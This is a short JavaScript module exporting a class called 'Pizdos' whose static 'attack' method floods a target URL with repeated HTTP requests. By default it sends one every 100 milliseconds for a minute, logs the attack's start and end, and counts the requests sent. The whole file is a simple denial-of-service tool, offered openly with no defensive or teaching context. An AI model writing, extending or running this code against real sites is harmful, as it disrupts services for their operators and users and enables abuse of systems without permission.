const r2 = require('r2')

module.exports = class Pizdos {
  /**
   * Starts attack on url using options.
   * @param {string} url 
   * @param {object} options
   * @returns {void}
   * @public
   */
  static attack(url, {
    duration = 60000,
    frequency = 100,
    log = console.log
  } = {}) {
    let requestsCount = 0

    log(`Attack started at ${new Date}.`)

    const intervalId = setInterval(async () => {
      try {
        await r2(url).text
      } catch (err) {
        clearInterval(intervalId)
        throw `Attack ended with an error.\n${err}`
      } finally {
        requestsCount++
      }
    }, frequency)

    setTimeout(() => {
      log(`Attack complete at ${new Date}. ${requestsCount} requests were sent.`)
      clearInterval(intervalId)
    }, duration)
  }
}
